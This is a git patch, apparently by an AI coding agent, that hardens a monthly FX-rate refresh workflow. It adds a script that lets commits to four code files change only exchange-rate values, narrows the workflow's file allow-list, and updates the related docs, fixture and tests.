@@ -1,0 +1,328 @@
+From edcdd103d5fb24b7a4a4aa3cd8e815c3d46a5f74 Mon Sep 17 00:00:00 2001
+From: Claude <noreply@anthropic.com>
+Date: Sat, 17 Oct 2026 02:10:12 +0000
+Subject: [PATCH 06/41] fix-sec-3: S-9 residual: the refresh commits FX values
+ only in code files, and never test code
+
+- monthly-refresh.yml commit step: after apply, .github/scripts/fx-values-only.mjs (from the tip's
+  .github/, which the refresh cannot write) masks the values the FX writer changes in the four code
+  copies (FX_PER_USD rows "  CODE: number,", FX_AS_OF, FX_SOURCE, EXTRA_FX_PER_USD, FX_FALLBACK CNY)
+  and refuses any other changed line before anything is committed.
+- Allow-list: README.md, docs/CONTRACT.md and test/juice.test.js removed. Only detect rules name them;
+  no writer writes them (test/juice.test.js holds no pinned FX example: its Big Mac date pin was made
+  relational earlier), so the refresh never edits test code.
+- test/monthly-refresh-commit.test.js: the allow-list now equals the writers' { file, content } write
+  sites; 9de373f's FX hunks (test/fixtures/refresh/fx-refresh-9de373f.json) are committed and deployed;
+  six ways of slipping code into an FX copy are refused with nothing pushed.
+- docs/DATA_FRESHNESS.md: safety model and pinned values.
+
+Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
+Claude-Session: https://claude.ai/code/session_014jaqot5Ddmi7Co6CofBiyc
+(cherry picked from commit 928ab7f4ee6eb741bbefcb6d9b61ce554c6e8e96)
+---
+ .github/scripts/fx-values-only.mjs            | 74 ++++++++++++++++++
+ .github/workflows/monthly-refresh.yml         | 16 ++--
+ docs/DATA_FRESHNESS.md                        | 12 +--
+ test/fixtures/refresh/fx-refresh-9de373f.json | 22 ++++++
+ test/monthly-refresh-commit.test.js           | 76 +++++++++++++++++--
+ 5 files changed, 181 insertions(+), 19 deletions(-)
+ create mode 100644 .github/scripts/fx-values-only.mjs
+ create mode 100644 test/fixtures/refresh/fx-refresh-9de373f.json
+
+diff --git a/.github/scripts/fx-values-only.mjs b/.github/scripts/fx-values-only.mjs
+new file mode 100644
+index 0000000..a9e89ec
+--- /dev/null
++++ b/.github/scripts/fx-values-only.mjs
+@@ -0,0 +1,74 @@
++#!/usr/bin/env node
++// monthly-refresh.yml's commit step (S-9 residual, docs/REVIEW.md "beta review 2026-10-16"): four of the files the
++// refresh may commit are code that reaches visitors' browsers (server/juice.js and server/salary.js through /lib/,
++// public/viz/palette.js and public/features/shared.js directly). The FX writer (scripts/refresh/fx.js) changes only
++// values in them:
++//   - the rows of the multi-line FX_PER_USD table, "  CODE: number," (keys are never added or dropped);
++//   - FX_AS_OF = 'YYYY-MM-DD' and FX_SOURCE = '<label>' (a plain one-line string);
++//   - salary.js's one-line EXTRA_FX_PER_USD table and shared.js's FX_FALLBACK CNY rate.
++// With exactly those values masked, each refreshed copy must equal HEAD's (the branch tip, which the step has
++// already checked equals the tested commit for these files), so any other change, a code line above all, is
++// refused. Node built-ins only; it reads no remote content and runs no npm.
++//
++//   node .github/scripts/fx-values-only.mjs <file>...   (in the repo, after the refreshed files were copied in)
++//   exit 0: every listed code file changes FX values only (other files are ignored); 1: refused, with the line.
++import { execFileSync } from 'node:child_process';
++import fs from 'node:fs';
++import { pathToFileURL } from 'node:url';
++import path from 'node:path';
++
++export const FX_CODE_FILES = Object.freeze(['server/juice.js', 'server/salary.js', 'public/viz/palette.js', 'public/features/shared.js']);
++const NUM = '[0-9][0-9.]*(?:e-?[0-9]+)?';
++const ROW = new RegExp(`^(  [A-Z]{3}): ${NUM},$`);
++const TABLE_START = /^(?:export )?const FX_PER_USD = Object\.freeze\(\{$/;
++const AS_OF = /^((?:export )?const FX_AS_OF = ')[0-9]{4}-[0-9]{2}-[0-9]{2}(';)$/;
++const SOURCE = /^((?:export )?const FX_SOURCE = ')[^'\\`$]*(';)$/;
++const EXTRA = new RegExp(`^const EXTRA_FX_PER_USD = Object\\.freeze\\(\\{ [A-Z]{3}: ${NUM}(?:, [A-Z]{3}: ${NUM})* \\}\\);$`);
++const FALLBACK = new RegExp(`^(export const FX_FALLBACK = Object\\.freeze\\(\\{ \\.\\.\\.\\(palette\\.FX_TO_USD \\|\\| \\{ USD: 1 \\}\\), CNY: )${NUM}( \\}\\);)$`);
++
++/** `text` with every value the FX writer may change replaced by "#". */
++export function fxSkeleton(text) {
++  let inTable = false;
++  return String(text).split('\n').map((l) => {
++    let m;
++    if (inTable) {
++      if (l === '});') { inTable = false; return l; }
++      return (m = ROW.exec(l)) ? `${m[1]}: #,` : l;
++    }
++    if (TABLE_START.test(l)) { inTable = true; return l; }
++    if ((m = AS_OF.exec(l)) || (m = SOURCE.exec(l)) || (m = FALLBACK.exec(l))) return `${m[1]}#${m[2]}`;
++    if (EXTRA.test(l)) return l.replace(new RegExp(`([A-Z]{3}): ${NUM}`, 'g'), '$1: #');
++    return l;
++  }).join('\n');
++}
++
++/** null when `after` changes only FX values of `before`, else { line, before, after } of the first other change. */
++export function fxOnlyDiff(before, after) {
++  const a = fxSkeleton(before).split('\n');
++  const b = fxSkeleton(after).split('\n');
++  const rawA = String(before).split('\n');
++  const rawB = String(after).split('\n');
++  for (let i = 0; i < Math.max(a.length, b.length); i++) {
++    if (a[i] !== b[i]) return { line: i + 1, before: rawA[i] ?? null, after: rawB[i] ?? null };
++  }
++  return null;
++}
++
++const isMain = process.argv[1] && import.meta.url === pathToFileURL(path.resolve(process.argv[1])).href;
++if (isMain) {
++  let bad = 0;
++  for (const f of process.argv.slice(2).filter((x) => FX_CODE_FILES.includes(x))) {
++    let base;
++    try { base = execFileSync('git', ['show', `HEAD:${f}`], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 }); } catch {
++      console.log(`::error::refusing to publish '${f}': not in the branch tip`);
++      bad++;
++      continue;
++    }
++    const d = fxOnlyDiff(base, fs.readFileSync(f, 'utf8'));
++    if (d) {
++      console.log(`::error::refusing to publish '${f}': line ${d.line} changes more than an FX value the refresh writes (was ${JSON.stringify(String(d.before).slice(0, 160))}, now ${JSON.stringify(String(d.after).slice(0, 160))})`);
++      bad++;
++    }
++  }
++  process.exit(bad ? 1 : 0);
++}
+diff --git a/.github/workflows/monthly-refresh.yml b/.github/workflows/monthly-refresh.yml
+index fe46e87..e42447d 100644
+--- a/.github/workflows/monthly-refresh.yml
++++ b/.github/workflows/monthly-refresh.yml
+@@ -297,16 +297,15 @@ jobs:
+           day=$(date -u +%Y-%m-%d)
+           run_url="$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
+           jq -r '.files[]' tmp/refresh/outcome.json > tmp/refresh/files.txt
+-          # Only the files the refresh writers can write (scripts/refresh: the registry and its generated
++          # Only the files the refresh writers write (scripts/refresh: run.js's registry and its generated
+           # inventory, bigmac/fx/rents' data/cities.json, fx.js FX_CODE_COPIES + SHARED_FALLBACK_FILE,
+-          # tax-watch.js TAX_FILE, derived.js README/LIVABILITY/CONTRACT, the pinned FX examples in
+-          # test/juice.test.js). Anything else is refused, so a buggy or compromised refresh job cannot
+-          # have this privileged step commit code (S-9). test/workflows.test.js keeps this list equal to
+-          # the writers' targets.
++          # derived.js LIVABILITY). Anything else is refused, so a buggy or compromised refresh job cannot
++          # have this privileged step commit code (S-9), and no test code is ever on the list.
++          # test/monthly-refresh-commit.test.js keeps this list equal to the writers' write targets.
+           apply() {
+             while IFS= read -r f; do
+               case "$f" in
+-                data/freshness.json|docs/DATA_FRESHNESS.md|data/cities.json|README.md|docs/LIVABILITY.md|docs/CONTRACT.md|server/juice.js|server/salary.js|public/viz/palette.js|public/features/shared.js|test/juice.test.js) ;;
++                data/freshness.json|docs/DATA_FRESHNESS.md|data/cities.json|docs/LIVABILITY.md|server/juice.js|server/salary.js|public/viz/palette.js|public/features/shared.js) ;;
+                 *) echo "::error::refusing to publish '$f' (not a file the refresh writes)"; exit 1 ;;
+               esac
+               printf '%s' "$f" | grep -Eq '^[A-Za-z0-9_][A-Za-z0-9_./-]*$' || { echo "::error::refusing to publish '$f'"; exit 1; }
+@@ -334,6 +333,11 @@ jobs:
+             fi
+             git checkout -q --detach FETCH_HEAD
+             apply
++            # S-9 residual: four of those files are code that reaches visitors' browsers. Each may differ from
++            # the tip only in the values the FX writer changes (its FX table rows "  CODE: number,", FX_AS_OF,
++            # FX_SOURCE, salary.js's EXTRA_FX_PER_USD, shared.js's FX_FALLBACK CNY rate); any other line, code
++            # above all, is refused. The checker comes from the tip's .github/, which the refresh cannot write.
++            xargs -a tmp/refresh/files.txt -d '\n' node .github/scripts/fx-values-only.mjs || { echo "::error::refusing to publish: a code file changes more than its FX values"; exit 1; }
+             xargs -a tmp/refresh/files.txt -d '\n' git add --
+             if git diff --cached --quiet; then echo "The branch already has these values; nothing to commit."; exit 0; fi
+             git commit -q -m "chore(data): monthly refresh of reference data ($day)" -m "Generated by .github/workflows/monthly-refresh.yml (scripts/refresh/run.js) after the full test suite passed on the refreshed data. Report: $run_url"
+diff --git a/docs/DATA_FRESHNESS.md b/docs/DATA_FRESHNESS.md
+index e481d34..9267d44 100644
+--- a/docs/DATA_FRESHNESS.md
++++ b/docs/DATA_FRESHNESS.md
+@@ -34,9 +34,10 @@ UI: dist/api/freshness.json (client subset of the registry) -> "as of" labels ne
+ **Safety model** (the user's decision, 2026-10-16: "Commit straight make a GitHub action for it"):
+ - A validated data change is committed straight to the run's branch (the default branch for the schedule, or a `TRUSTED_BRANCHES` dispatch), but only when the full `npm test` suite passed against the refreshed data **and** the refresh reported no problems. Otherwise nothing is published and the data-freshness issue says why (tests failed, or which problems).
+ - The commit is never force-pushed: a rejected push refetches the branch and re-applies the same files, up to 4 times. It then dispatches CI and the Pages deploy for the new commit, because a push made with `GITHUB_TOKEN` starts no workflow.
+-- Only files the refresh writers write are committed: an allow-list (the registry and its inventory, `data/cities.json`, README, LIVABILITY, CONTRACT, the FX code copies and `test/juice.test.js`), so a faulty refresh job cannot commit code. The ref must be a branch (`refs/heads/…`), not a tag of the same name.
++- Only files the refresh writers write are committed: an allow-list of the registry and its inventory, `data/cities.json`, `docs/LIVABILITY.md` and the four FX code copies (`server/juice.js`, `server/salary.js`, `public/viz/palette.js`, `public/features/shared.js`), so a faulty refresh job cannot commit code. No test file is on the list: the refresh never edits test code (README, CONTRACT and `test/juice.test.js` were on it until 2026-10-17, but only detect rules read them; nothing writes them). The ref must be a branch (`refs/heads/…`), not a tag of the same name.
++- The four FX code copies reach visitors' browsers, so each may differ from the branch tip only in the values the FX writer changes: the `FX_PER_USD` table rows (`  CODE: number,`, keys never added or dropped), `FX_AS_OF`, `FX_SOURCE` (a plain one-line string), salary.js's one-line `EXTRA_FX_PER_USD` and shared.js's `FX_FALLBACK` CNY rate. `.github/scripts/fx-values-only.mjs` masks those values and requires the rest of each file to be unchanged; any other line, code above all, stops the step before anything is committed. The first real refresh (`9de373f`) passes it (`test/fixtures/refresh/fx-refresh-9de373f.json`).
+ - The data is never copied over a tip that changed one of the refreshed files after the tested commit: the step refuses and the next run starts fresh. When the tip moved only in `wip/` (checkpoints), it commits and deploys. When other code moved, it commits and runs CI, and the next deploy ships it, so an untested tree is never deployed at once.
+-- `test/workflows.test.js` pins the push rules (one push to the target branch, never forced, inside the step gated on tests and problems, to the run's own branch only). `test/monthly-refresh-commit.test.js` runs the step's own shell against scratch git repositories for each case, and checks that the allow-list equals the writers' targets.
++- `test/workflows.test.js` pins the push rules (one push to the target branch, never forced, inside the step gated on tests and problems, to the run's own branch only). `test/monthly-refresh-commit.test.js` runs the step's own shell against scratch git repositories for each case (including the 9de373f replay and six ways of slipping code into an FX copy), and checks that the allow-list equals the writers' write sites (`{ file, content }` in `scripts/refresh/*.js`, plus the registry and its inventory).
+ - The repository variable `REFRESH_PUBLISH=pr` switches back to the review model: a commit on `bot/monthly-refresh`, opened as a pull request for a human.
+ - Two jobs. `refresh` fetches and parses the remote pages and PDFs, and runs `npm ci` and the tests, with a **read-only** token. `publish` holds the write token. It checks out without persisted credentials and never runs npm or parses remote content. It re-applies exactly the files `refresh` reported (from a 7-day `monthly-refresh-changes` artifact), refuses any path outside the data and code copies (`.github/`, dotfiles, `..`, `package*.json`), and passes the token to the one `git push` through environment config, never `.git/config`.
+ - Only the scheduled run (GitHub runs schedules on the default branch only) or a dispatch on the default branch or `TRUSTED_BRANCHES` publishes. A dispatch from any other branch is report-only.
+@@ -305,13 +306,14 @@ Typical publication dates:
+ - **Before 2026-10.** The table was the Big Mac `dollar_ex` column. It was refreshed only twice a year, and the code copies were updated by hand.
+ 
+ ### Pinned values
+-Some tests and docs pin numbers that move when the data refreshes:
+-- worked examples at a given FX;
+-- `DOC.bigMac.asOf === '2026-07-01'`;
++Some docs pin numbers that move when the data refreshes:
++- worked examples at a given FX (docs/LIVABILITY.md);
+ - README counts.
+ 
+ `scripts/refresh/derived.js` regenerates the generated blocks (`<!-- freshness:... -->` markers) in each refresh PR. Hand-written figures are checked and reported as drift.
+ 
++Tests never pin a refreshed data value as a literal, and the refresh never edits a test: a test reads the value from the data (`test/juice.test.js` compares the Big Mac release with `DOC.bigMac.asOf`, not a date), and the `e2e-pinned-values` check reports any pin that comes back. A test that does pin one fails the refresh's own test run, so nothing is committed until a person fixes the test.
++
+ The refresh's gate runs `npm test`, not the browser suite (`scripts/e2e.js`). So an e2e test that pins a converted
+ figure passes the gate and breaks after a refresh. The first real FX refresh (2026-10-16) did this to Fix app
+ [P-5] ("£80,000 ≈ $108K" became $107K). E2e tests build their expected figures from the app's own rates (`toUSD`
+diff --git a/test/fixtures/refresh/fx-refresh-9de373f.json b/test/fixtures/refresh/fx-refresh-9de373f.json
+new file mode 100644
+index 0000000..9e2d13a
+--- /dev/null
++++ b/test/fixtures/refresh/fx-refresh-9de373f.json
+@@ -0,0 +1,22 @@
++{
++ "about": "The FX code-copy hunks of commit 9de373f, the first real monthly refresh (run 38975710742), with 8 lines of context: before = context and removed lines, after = context and added lines, hunks joined by a \"// … (hunk) …\" line. test/monthly-refresh-commit.test.js replays them through the commit step, which must accept them (S-9 residual). Generated by docs/process/fix-sec-3.md step \"FX fixture\".",
++ "commit": "9de373fd52d9b6ad912f00f498dc31f694ab4a11",
++ "files": {
++  "server/juice.js": {
++   "before": "// FX. Copied from public/viz/palette.js (FX_TO_USD, viz workstream) so juice amounts\n// are in the same \"approx USD\" unit the salary chart plots. Currencies the palette\n// does not list fall back to the city's fxPerUSD (data/cities.json). The monthly refresh\n// (scripts/refresh/fx.js) rewrites data/cities.json fx, this table, FX_AS_OF and FX_SOURCE\n// together; docs/DATA_FRESHNESS.md \"FX\".\n// ---------------------------------------------------------------------------\n// FX date and source reported in computeJuice inputs.fx (equal to data/cities.json fx.asOf and\n// fx.source.name; test/freshness.test.js checks both).\nexport const FX_AS_OF = '2026-07-01';\nexport const FX_SOURCE = 'The Economist Big Mac index source data v2, dollar_ex column (release 2026-07-01)';\n// Keep in sync with public/viz/palette.js FX_PER_USD (as of 2026-07-01);\n// test/fx-consistency.test.js fails if they drift.\nexport const FX_PER_USD = Object.freeze({\n  AED: 3.67285,\n  AUD: 1.42867347667691,\n  BRL: 5.07935,\n  CAD: 1.40515,\n  CHF: 0.80735,\n  CZK: 21.1625,\n  DKK: 6.5366,\n  EUR: 0.87439,\n  GBP: 0.74187,\n  HKD: 7.83895,\n  ILS: 2.9993,\n  INR: 96.26375,\n  JPY: 162.135,\n  KRW: 1485.9,\n  MXN: 17.386,\n  NOK: 9.68565,\n  NZD: 1.71335560695622,\n  PLN: 3.77915,\n  RON: 4.58165,\n  SAR: 3.755,\n  SEK: 9.63495,\n  SGD: 1.29005,\n  TWD: 32.1875,\n  USD: 1,\n});\nexport const FX_TO_USD = Object.freeze(Object.fromEntries(\n  Object.entries(FX_PER_USD).map(([c, per]) => [c, c === 'USD' ? 1 : 1 / per])));\n\n// Annual single-person living costs excluding rent in New York City: Numbeo's\n// \"estimated monthly costs for a single person, excluding rent\" ($1,665.2, Sep 2026) × 12.\n// Same value as data/cities.json baseline.nycBasketUSD (a test keeps them equal).\n",
++   "after": "// FX. Copied from public/viz/palette.js (FX_TO_USD, viz workstream) so juice amounts\n// are in the same \"approx USD\" unit the salary chart plots. Currencies the palette\n// does not list fall back to the city's fxPerUSD (data/cities.json). The monthly refresh\n// (scripts/refresh/fx.js) rewrites data/cities.json fx, this table, FX_AS_OF and FX_SOURCE\n// together; docs/DATA_FRESHNESS.md \"FX\".\n// ---------------------------------------------------------------------------\n// FX date and source reported in computeJuice inputs.fx (equal to data/cities.json fx.asOf and\n// fx.source.name; test/freshness.test.js checks both).\nexport const FX_AS_OF = '2026-09-30';\nexport const FX_SOURCE = 'ECB euro reference rates, monthly averages 2026-09, crossed through USD; TWD Federal Reserve G.5; AED/SAR/QAR official pegs';\n// Keep in sync with public/viz/palette.js FX_PER_USD (as of 2026-07-01);\n// test/fx-consistency.test.js fails if they drift.\nexport const FX_PER_USD = Object.freeze({\n  AED: 3.6725,\n  AUD: 1.40411,\n  BRL: 5.14428,\n  CAD: 1.39602,\n  CHF: 0.819046,\n  CZK: 21.1031,\n  DKK: 6.49268,\n  EUR: 0.868566,\n  GBP: 0.745338,\n  HKD: 7.84324,\n  ILS: 3.03192,\n  INR: 95.4677,\n  JPY: 156.38,\n  KRW: 1358.37,\n  MXN: 17.2373,\n  NOK: 9.3808,\n  NZD: 1.73371,\n  PLN: 3.77349,\n  RON: 4.57148,\n  SAR: 3.75,\n  SEK: 9.75649,\n  SGD: 1.27261,\n  TWD: 31.7381,\n  USD: 1,\n});\nexport const FX_TO_USD = Object.freeze(Object.fromEntries(\n  Object.entries(FX_PER_USD).map(([c, per]) => [c, c === 'USD' ? 1 : 1 / per])));\n\n// Annual single-person living costs excluding rent in New York City: Numbeo's\n// \"estimated monthly costs for a single person, excluding rent\" ($1,665.2, Sep 2026) × 12.\n// Same value as data/cities.json baseline.nycBasketUSD (a test keeps them equal).\n"
++  },
++  "server/salary.js": {
++   "before": "\n/* ------------------------------------------------------------ currencies */\n\n// FX for plausibility bounds and cross-currency comparison only (never shown\n// to users). Keep in sync with public/viz/palette.js FX_PER_USD (as of\n// 2026-07-01, from data/cities.json's FX); copied verbatim here because this\n// module is bundled on its own. test/fx-consistency.test.js fails on drift.\nexport const FX_PER_USD = Object.freeze({\n  AED: 3.67285,\n  AUD: 1.42867347667691,\n  BRL: 5.07935,\n  CAD: 1.40515,\n  CHF: 0.80735,\n  CZK: 21.1625,\n  DKK: 6.5366,\n  EUR: 0.87439,\n  GBP: 0.74187,\n  HKD: 7.83895,\n  ILS: 2.9993,\n  INR: 96.26375,\n  JPY: 162.135,\n  KRW: 1485.9,\n  MXN: 17.386,\n  NOK: 9.68565,\n  NZD: 1.71335560695622,\n  PLN: 3.77915,\n  RON: 4.58165,\n  SAR: 3.755,\n  SEK: 9.63495,\n  SGD: 1.29005,\n  TWD: 32.1875,\n  USD: 1,\n});\n// Currencies the palette table lacks (rough, per USD; bounds only).\nconst EXTRA_FX_PER_USD = Object.freeze({ QAR: 3.64, CNY: 7.14, ZAR: 18.2 });\n\n/** USD per one unit of each currency (1 / FX_PER_USD), e.g. GBP ≈ 1.348. */\nexport const USD_PER = Object.freeze(Object.fromEntries(\n  Object.entries({ ...EXTRA_FX_PER_USD, ...FX_PER_USD }).map(([c, per]) => [c, c === 'USD' ? 1 : 1 / per])));\n\n/** amount in `currency` -> rough USD (null for an unknown currency). */\nexport function toUSD(amount, currency) {\n  const r = USD_PER[String(currency || 'USD').toUpperCase()];\n",
++   "after": "\n/* ------------------------------------------------------------ currencies */\n\n// FX for plausibility bounds and cross-currency comparison only (never shown\n// to users). Keep in sync with public/viz/palette.js FX_PER_USD (as of\n// 2026-07-01, from data/cities.json's FX); copied verbatim here because this\n// module is bundled on its own. test/fx-consistency.test.js fails on drift.\nexport const FX_PER_USD = Object.freeze({\n  AED: 3.6725,\n  AUD: 1.40411,\n  BRL: 5.14428,\n  CAD: 1.39602,\n  CHF: 0.819046,\n  CZK: 21.1031,\n  DKK: 6.49268,\n  EUR: 0.868566,\n  GBP: 0.745338,\n  HKD: 7.84324,\n  ILS: 3.03192,\n  INR: 95.4677,\n  JPY: 156.38,\n  KRW: 1358.37,\n  MXN: 17.2373,\n  NOK: 9.3808,\n  NZD: 1.73371,\n  PLN: 3.77349,\n  RON: 4.57148,\n  SAR: 3.75,\n  SEK: 9.75649,\n  SGD: 1.27261,\n  TWD: 31.7381,\n  USD: 1,\n});\n// Currencies the palette table lacks (rough, per USD; bounds only).\nconst EXTRA_FX_PER_USD = Object.freeze({ QAR: 3.64, CNY: 6.70897, ZAR: 16.2109 });\n\n/** USD per one unit of each currency (1 / FX_PER_USD), e.g. GBP ≈ 1.348. */\nexport const USD_PER = Object.freeze(Object.fromEntries(\n  Object.entries({ ...EXTRA_FX_PER_USD, ...FX_PER_USD }).map(([c, per]) => [c, c === 'USD' ? 1 : 1 / per])));\n\n/** amount in `currency` -> rough USD (null for an unknown currency). */\nexport function toUSD(amount, currency) {\n  const r = USD_PER[String(currency || 'USD').toUpperCase()];\n"
++  },
++  "public/viz/palette.js": {
++   "before": " * Static FX: local currency units per 1 USD, equal to data/cities.json `fx.perUSD` so the\n * chart, Compstimate and the Juice Score all use one table. The source and date are FX_SOURCE\n * and FX_AS_OF (equal to cities.json fx.source.name and fx.asOf). The monthly refresh\n * (scripts/refresh/fx.js: ECB monthly reference rates crossed through USD, TWD from the\n * Federal Reserve G.5, AED/SAR/QAR official pegs) rewrites cities.json, this table and\n * server/juice.js together; test/fx-consistency.test.js keeps the copies equal.\n * Labelled \"approx USD\" in the UI; there is no live FX.\n */\nexport const FX_AS_OF = '2026-07-01';\nexport const FX_SOURCE = 'The Economist Big Mac index source data v2, dollar_ex column (release 2026-07-01)';\nexport const FX_PER_USD = Object.freeze({\n  AED: 3.67285,\n  AUD: 1.42867347667691,\n  BRL: 5.07935,\n  CAD: 1.40515,\n  CHF: 0.80735,\n  CZK: 21.1625,\n  DKK: 6.5366,\n  EUR: 0.87439,\n  GBP: 0.74187,\n  HKD: 7.83895,\n  ILS: 2.9993,\n  INR: 96.26375,\n  JPY: 162.135,\n  KRW: 1485.9,\n  MXN: 17.386,\n  NOK: 9.68565,\n  NZD: 1.71335560695622,\n  PLN: 3.77915,\n  RON: 4.58165,\n  SAR: 3.755,\n  SEK: 9.63495,\n  SGD: 1.29005,\n  TWD: 32.1875,\n  USD: 1,\n});\n\n/** USD per one unit of each currency (1 / FX_PER_USD), e.g. GBP ≈ 1.348. */\nexport const FX_TO_USD = Object.freeze(Object.fromEntries(\n  Object.entries(FX_PER_USD).map(([c, per]) => [c, c === 'USD' ? 1 : 1 / per])));\n\n/** Convert amount in currency to approximate USD. Unknown currency -> amount unchanged. */\n",
++   "after": " * Static FX: local currency units per 1 USD, equal to data/cities.json `fx.perUSD` so the\n * chart, Compstimate and the Juice Score all use one table. The source and date are FX_SOURCE\n * and FX_AS_OF (equal to cities.json fx.source.name and fx.asOf). The monthly refresh\n * (scripts/refresh/fx.js: ECB monthly reference rates crossed through USD, TWD from the\n * Federal Reserve G.5, AED/SAR/QAR official pegs) rewrites cities.json, this table and\n * server/juice.js together; test/fx-consistency.test.js keeps the copies equal.\n * Labelled \"approx USD\" in the UI; there is no live FX.\n */\nexport const FX_AS_OF = '2026-09-30';\nexport const FX_SOURCE = 'ECB euro reference rates, monthly averages 2026-09, crossed through USD; TWD Federal Reserve G.5; AED/SAR/QAR official pegs';\nexport const FX_PER_USD = Object.freeze({\n  AED: 3.6725,\n  AUD: 1.40411,\n  BRL: 5.14428,\n  CAD: 1.39602,\n  CHF: 0.819046,\n  CZK: 21.1031,\n  DKK: 6.49268,\n  EUR: 0.868566,\n  GBP: 0.745338,\n  HKD: 7.84324,\n  ILS: 3.03192,\n  INR: 95.4677,\n  JPY: 156.38,\n  KRW: 1358.37,\n  MXN: 17.2373,\n  NOK: 9.3808,\n  NZD: 1.73371,\n  PLN: 3.77349,\n  RON: 4.57148,\n  SAR: 3.75,\n  SEK: 9.75649,\n  SGD: 1.27261,\n  TWD: 31.7381,\n  USD: 1,\n});\n\n/** USD per one unit of each currency (1 / FX_PER_USD), e.g. GBP ≈ 1.348. */\nexport const FX_TO_USD = Object.freeze(Object.fromEntries(\n  Object.entries(FX_PER_USD).map(([c, per]) => [c, c === 'USD' ? 1 : 1 / per])));\n\n/** Convert amount in currency to approximate USD. Unknown currency -> amount unchanged. */\n"
++  },
++  "public/features/shared.js": {
++   "before": "// ---------------------------------------------------------------------------\n// FX\n// ---------------------------------------------------------------------------\n\n/**\n * FX to USD: exactly palette.js's table (the app's single source), plus a currency it\n * lacks. No rate here may disagree with the palette (task force: one FX table).\n */\nexport const FX_FALLBACK = Object.freeze({ ...(palette.FX_TO_USD || { USD: 1 }), CNY: 0.14 });\n\n/**\n * Convert an amount to approximate USD. Uses palette.toUSD when palette knows\n * the currency, else FX_FALLBACK. Unknown currency or bad amount -> null\n * (callers drop such jobs rather than mixing currencies).\n */\nexport function toUSD(amount, currency = 'USD') {\n  const a = Number(amount);\n",
++   "after": "// ---------------------------------------------------------------------------\n// FX\n// ---------------------------------------------------------------------------\n\n/**\n * FX to USD: exactly palette.js's table (the app's single source), plus a currency it\n * lacks. No rate here may disagree with the palette (task force: one FX table).\n */\nexport const FX_FALLBACK = Object.freeze({ ...(palette.FX_TO_USD || { USD: 1 }), CNY: 0.1491 });\n\n/**\n * Convert an amount to approximate USD. Uses palette.toUSD when palette knows\n * the currency, else FX_FALLBACK. Unknown currency or bad amount -> null\n * (callers drop such jobs rather than mixing currencies).\n */\nexport function toUSD(amount, currency = 'USD') {\n  const a = Number(amount);\n"
++  }
++ }
++}
+diff --git a/test/monthly-refresh-commit.test.js b/test/monthly-refresh-commit.test.js
+index e2e0cf2..d28390f 100644
+--- a/test/monthly-refresh-commit.test.js
++++ b/test/monthly-refresh-commit.test.js
+@@ -26,13 +26,22 @@ function stepScript(name) {
+   return out.join('\n');
+ }
+ 
+-function setup({ files = ['data/cities.json'], moveTip = null, ref = `refs/heads/${BRANCH}` } = {}) {
++/**
++ * A scratch origin, the publish job's checkout and the refresh job's artifacts, then the step run for real.
++ * `seed`: extra files of the tested commit { path: text }; `changes`: refreshed contents { path: text }
++ * (default "refreshed <path>"). The step's FX checker (.github/scripts/fx-values-only.mjs) is in every commit.
++ */
++function setup({ files = ['data/cities.json'], moveTip = null, ref = `refs/heads/${BRANCH}`, seed: extra = {}, changes = {} } = {}) {
+   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'melon-refresh-commit-'));
+   const origin = path.join(dir, 'origin.git');
+   git(dir, 'init', '-q', '--bare', origin);
+   const seed = path.join(dir, 'seed');
+   git(dir, 'clone', '-q', origin, seed);
+   git(seed, 'checkout', '-q', '-b', BRANCH);
++  for (const [f, text] of Object.entries({ ...extra, '.github/scripts/fx-values-only.mjs': fs.readFileSync(path.join(ROOT, '.github', 'scripts', 'fx-values-only.mjs'), 'utf8') })) {
++    fs.mkdirSync(path.join(seed, path.dirname(f)), { recursive: true });
++    fs.writeFileSync(path.join(seed, f), text);
++  }
+   for (const f of ['data/cities.json', 'data/freshness.json', 'server/app.js', 'wip/lane/STATUS.md']) {
+     fs.mkdirSync(path.join(seed, path.dirname(f)), { recursive: true });
+     fs.writeFileSync(path.join(seed, f), `old ${f}\n`);
+@@ -53,7 +62,7 @@ function setup({ files = ['data/cities.json'], moveTip = null, ref = `refs/heads
+   fs.writeFileSync(path.join(work, 'tmp', 'refresh', 'outcome.json'), JSON.stringify({ files }));
+   for (const f of files) {
+     fs.mkdirSync(path.join(work, 'tmp', 'changes', path.dirname(f)), { recursive: true });
+-    fs.writeFileSync(path.join(work, 'tmp', 'changes', f), `refreshed ${f}\n`);
++    fs.writeFileSync(path.join(work, 'tmp', 'changes', f), changes[f] ?? `refreshed ${f}\n`);
+   }
+   const bin = path.join(dir, 'bin');
+   fs.mkdirSync(bin);
+@@ -130,18 +139,69 @@ test('S-9 hygiene: a tag named like the branch is refused', () => {
+   done(t);
+ });
+ 
+-test('S-9: the allow-list equals the files the refresh writers write', async () => {
++test('S-9: the allow-list equals the files the refresh writers write (their write sites, not the files detect rules read)', async () => {
+   const lib = (m) => import(path.join(ROOT, 'scripts', 'refresh', m));
+   const { FX_CODE_COPIES, SHARED_FALLBACK_FILE } = await lib('fx.js');
+   const { LIVABILITY } = await lib('derived.js');
+-  const { TAX_FILE } = await lib('tax-watch.js');
+-  const literal = new Set();
++  const { FX_CODE_FILES } = await import(path.join(ROOT, '.github', 'scripts', 'fx-values-only.mjs'));
++  // Every write is a `{ file: <target>, content: … }` in an updater; the orchestrator (run.js) also writes the
++  // registry and its inventory. Detect rules name other files (README.md, docs/CONTRACT.md, test/juice.test.js)
++  // but never write them, so they are not on the list (fix-sec-3).
++  const named = { 'copy.file': FX_CODE_COPIES.map((c) => c.file), SHARED_FALLBACK_FILE: [SHARED_FALLBACK_FILE], LIVABILITY: [LIVABILITY] };
++  const writers = new Set(['data/freshness.json', 'docs/DATA_FRESHNESS.md']);
++  let sites = 0;
+   for (const f of fs.readdirSync(path.join(ROOT, 'scripts', 'refresh')).filter((x) => x.endsWith('.js'))) {
+     const src = fs.readFileSync(path.join(ROOT, 'scripts', 'refresh', f), 'utf8');
+-    for (const m of src.matchAll(/\bfile: '([^']+\.(?:json|md|js))'/g)) literal.add(m[1]);
++    for (const m of src.matchAll(/\{\s*file:\s*([^,{}]+?)\s*,\s*content:/g)) {
++      sites++;
++      const lit = /^'([^']+)'$/.exec(m[1]);
++      if (lit) { writers.add(lit[1]); continue; }
++      assert.ok(named[m[1]], `scripts/refresh/${f} writes { file: ${m[1]} }: map it in this test`);
++      for (const x of named[m[1]]) writers.add(x);
++    }
+   }
